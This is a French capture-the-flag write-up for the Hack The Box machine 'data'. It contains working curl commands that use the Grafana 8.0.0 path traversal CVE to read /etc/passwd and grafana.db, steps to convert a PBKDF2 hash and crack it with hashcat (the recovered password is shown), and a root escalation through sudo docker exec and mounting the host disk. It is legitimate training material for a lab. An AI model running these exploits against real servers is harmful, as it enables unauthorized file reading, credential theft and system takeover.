---
title: data
description: If you find it, that is...
tags:
  - HTB
  - machine
  - pbkdf2
  - docker
date: 2026-04-01T10:14
tasks:
  - format
parent file:
  - "[[HTB MOC]]"
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "8"
seasonal: no
---

# Foothold

Un premier scan nous montre que l'on a aucun site web mais bien un port ouvert.
```
# Nmap 7.93 scan initiated Wed Apr  1 10:35:56 2026 as: nmap -sCV -T4 -oN nmap.out data.htb
Nmap scan report for data.htb (10.129.12.1)
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63470a81ad0f7807464b15524a4d1e39 (RSA)
|   256 7da9acfa01e8dd09904048ecddf308be (ECDSA)
|_  256 91332d1a81871a84d3b90b23233d194b (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
[...]
```

On voit que c'est un service web mais que l'on ne peut y accéder par un navigateur.

Avec quelques scans ffuf et un jq on arrive à trouver quelques pages
```
ffuf -u http://$url:3000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -o dirs.json
ffuf -u http://$url:3000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt -o files.json     
cat *.json | jq '.results[] | select(.status != 302) | {status:.status,url:.url}' -c
```
On trouve
```
{"status":200,"url":"http://data.htb:3000/login"}
{"status":200,"url":"http://data.htb:3000/signup"}
{"status":200,"url":"http://data.htb:3000/verify"}
{"status":200,"url":"http://data.htb:3000/metrics"}
{"status":401,"url":"http://data.htb:3000/api-doc"}
{"status":401,"url":"http://data.htb:3000/apis"}
{"status":401,"url":"http://data.htb:3000/api_test"}
{"status":401,"url":"http://data.htb:3000/api3"}
{"status":401,"url":"http://data.htb:3000/apicache"}
{"status":401,"url":"http://data.htb:3000/apimage"}
{"status":401,"url":"http://data.htb:3000/api2"}
{"status":401,"url":"http://data.htb:3000/api4"}
{"status":401,"url":"http://data.htb:3000/api.php"}
{"status":200,"url":"http://data.htb:3000/robots.txt"}
{"status":401,"url":"http://data.htb:3000/api.aspx"}
{"status":401,"url":"http://data.htb:3000/apichain.php"}
```
Malheureusement `/signup` ne fonctionne pas. On voit sur la page de connexion la version de grafana:
```
v8.0.0 (41f0542c1e)
```

On voit dans la page `/metrics` des infos intéressantes:
```
grafana_http_request_duration_seconds_bucket{handler="/api/user/signup/step2",method="POST",status_code="401",le="0.005"} 1
grafana_http_request_duration_seconds_bucket{handler="/admin",method="GET",status_code="302",le="0.005"} 2
grafana_http_request_duration_seconds_bucket{handler="/explore",method="GET",status_code="302",le="0.005"} 1
```

On regarde l'explication de la CVE sur cette version et on trouve que l'on peut obtenir le fichier que l'on veut avec
```
curl --path-as-is http://data.htb:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```
Et on obtient bien notre fichier
```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

On cherche un peu plus et on trouve [ce](https://hackerone.com/reports/1427086) lien qui nous indique quoi chercher.

On fetch enfin la configuration
```
curl --path-as-is http://data.htb:3000/public/plugins/alertlist/../../../../../../../../usr/share/grafana/conf/defaults.ini
```
malheureusement cela ne nous donne rien. On continue avec [ce](https://www.vulncheck.com/blog/grafana-cve-2021-43798) guide et on trouve le lien d'un fichier intéressant à fetch
```
curl --path-as-is http://data.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db --output grafana.db
```

Cette fois on a la db. On l'ouvre localement et on dump le contenu.
```
sqlite3 grafana.db
.tables
select * from user;
```

![[Pasted image 20260401173612.png]]

Et on a un hash (celui de boris, qui ressemble plus au nom d'un utilisateur), et on le crack avec hashcat
```
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
```

Mais avant ça il nous faut trouver le curieux format de ce hash. On trouve sur [cette](https://github.com/iamaldi/grafana2hashcat) page git que grafana utilise `PBKDF2_HMAC_SHA256` pour hasher avec 10000 itérations et qu'on récupère à la fin la valeur stockée en hex. On va retransformer notre hash. On utilise pour cela la doc de la fonction que l'on trouve
```
// File: https://github.com/grafana/grafana/blob/f496c31018cdb5ecc8b3c30ea96a235a5bcf470a/pkg/util/encoding.go#L33-L37
// Commit: https://github.com/grafana/grafana/commit/574553ec7bb5e61c6a362ceb9f28cc9e1c8f6f63
[...]

// EncodePassword encodes a password using PBKDF2.
func EncodePassword(password string, salt string) (string, error) {
	newPasswd := pbkdf2.Key([]byte(password), []byte(salt), 10000, 50, sha256.New)
	return hex.EncodeToString(newPasswd), nil
}

[...]
```

Pour créer un hash que hashcat peut traiter (format `encryption:iteration:base64_salt:base64_hash`)
```
echo "sha256:10000:$(echo -n 'LCBhdtJWjl' | base64):$(echo -n 'dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8' | xxd -r -p | base64)" > hash.txt
hashcat -a 0 -m 10900 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

Et on obtient assez vite un résultat:
```
beautiful1
```

![[Pasted image 20260401182859.png]]

Evidemment, on obtient un accès ssh
![[Pasted image 20260401183227.png]]
Et voilà, notre flag user.

# PrivEsc to root

On passe directement à la privesc vers root comme on a accès à un utilisateur directement.

Ensuite,
```
sudo -l
```
nous donne directement accès à `docker exec` avec des droits root.
```
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

On tente un peu quelques trucs mais ce que l'on comprend c'est que l'on peut exécuter ce que l'on veut sur les dockers à condition de trouver lequel lancer. On va donc chercher un docker.
```
docker ps
```
ne fonctionne malheureusement pas, en revanche
```
ps aux | grep docker
```
fonctionne bien et nous donne un identifiant de docker. On s'y connecte donc en tant que root et avec un shell et on croise les doigts pour qu'il soit privilégié (évidemment il l'est).
```
sudo /snap/bin/docker exec -u root -it e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
```
Et avec ça on peut monter la partition intéressante et y trouver notre flag.
```
mount /dev/sda1 /mnt
cat /mnt/root/root.txt
```

Et voilà, on a notre accès root et notre flag!
![[Pasted image 20260402114637.png]]

![[Pasted image 20260402114830.png]]